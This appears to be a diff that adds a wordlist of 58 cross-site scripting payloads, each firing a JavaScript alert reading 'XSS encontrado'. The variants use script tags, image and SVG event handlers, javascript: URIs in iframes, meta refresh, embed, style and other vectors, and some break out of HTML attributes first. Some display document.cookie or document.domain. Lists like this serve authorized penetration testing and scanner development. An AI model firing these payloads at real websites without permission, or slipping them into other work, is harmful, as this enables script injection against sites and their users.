@@ -1,0 +1,58 @@
+<script>alert('XSS encontrado')</script>
+<ScRiPt>alert('XSS encontrado')</ScRiPt>
+#<script>alert("XSS encontrado")</script>
+<img src=1 href=1 onerror="javascript:alert('XSS encontrado')"></img>
+'<img src=1 href=1 onerror="javascript:alert('XSS encontrado')"></img>
+"<img src=1 href=1 onerror="javascript:alert('XSS encontrado')"></img>
+</option></select><img src="" onerror="alert('XSS encontrado')">
+'</option></select><img src="" onerror="alert('XSS encontrado')">
+"</option></select><img src="" onerror="alert('XSS encontrado')">
+<script>alert(document.domain + ' XSS encontrado')</script>
+"><script>alert('XSS encontrado')</script>
+"><script>alert(document.domain + ' XSS encontrado')</script>
+'><script>alert('XSS encontrado')</script>
+'><script>alert(document.domain + ' XSS encontrado')</script>
+<img src="x" onerror="alert('XSS encontrado')">
+<img src=x onerror=alert("XSS encontrado")>
+"><img src=x onerror=alert('XSS encontrado')>
+"><img src=x onerror=alert(document.domain + ' XSS encontrado')>
+'><img src=x onerror=alert('XSS encontrado')>
+'><img src=x onerror=alert(document.domain + ' XSS encontrado')>
+<script>alert(document.cookie + ' XSS encontrado')</script>
+<script>alert(document.referrer + ' XSS encontrado')</script>
+"><svg onload=alert('XSS encontrado')>
+"><svg onload=alert(document.domain + ' XSS encontrado')>
+'><svg onload=alert('XSS encontrado')>
+'><svg onload=alert(document.domain + ' XSS encontrado')>
+"><iframe src=javascript:alert('XSS encontrado')>
+"><iframe src=javascript:alert(document.domain + ' XSS encontrado')>
+'><iframe src=javascript:alert('XSS encontrado')>
+'><iframe src=javascript:alert(document.domain + ' XSS encontrado')>
+"><body onload=alert('XSS encontrado')>
+"><body onload=alert(document.domain + ' XSS encontrado')>
+'><body onload=alert('XSS encontrado')>
+'><body onload=alert(document.domain + ' XSS encontrado')>
+"><form><button formaction=javascript:alert('XSS encontrado')>CLICKME</button></form>
+"><details open ontoggle=alert('XSS encontrado')>
+"><details open ontoggle=alert(document.domain + ' XSS encontrado')>
+"><marquee onstart=alert('XSS encontrado')>
+"><marquee onstart=alert(document.domain + ' XSS encontrado')>
+"><video><source onerror="alert('XSS encontrado')">
+"><video><source onerror=alert(document.domain + ' XSS encontrado')>
+"><embed src="data:text/html,<script>alert('XSS encontrado')</script>">
+"><embed src="data:text/html,<script>alert(document.domain + ' XSS encontrado')</script>">
+"><base href="javascript:alert('XSS encontrado')//">
+"><isindex action="javascript:alert('XSS encontrado')">
+"><meta http-equiv="refresh" content="0;url=javascript:alert('XSS encontrado')">
+"><meta http-equiv="refresh" content="0;url=javascript:alert(document.domain + ' XSS encontrado')">
+"><link rel="stylesheet" href="javascript:alert('XSS encontrado')">
+"><link rel="stylesheet" href="javascript:alert(document.domain + ' XSS encontrado')">
+"><style>@import 'javascript:alert('XSS encontrado')'</style>
+"><style>@import 'javascript:alert(document.domain + ' XSS encontrado')'</style>
+"><script>alert(navigator.userAgent + ' XSS encontrado')</script>
+"><script>alert(window.location + ' XSS encontrado')</script>
+"><script>alert(parent.origin + ' XSS encontrado')</script>
+"><img src="javascript:alert('XSS encontrado')">
+"><img src="javascript:alert(document.domain + ' XSS encontrado')">
+"><iframe src="javascript:alert('XSS encontrado')">
+"><iframe src="javascript:alert(document.domain + ' XSS encontrado')">
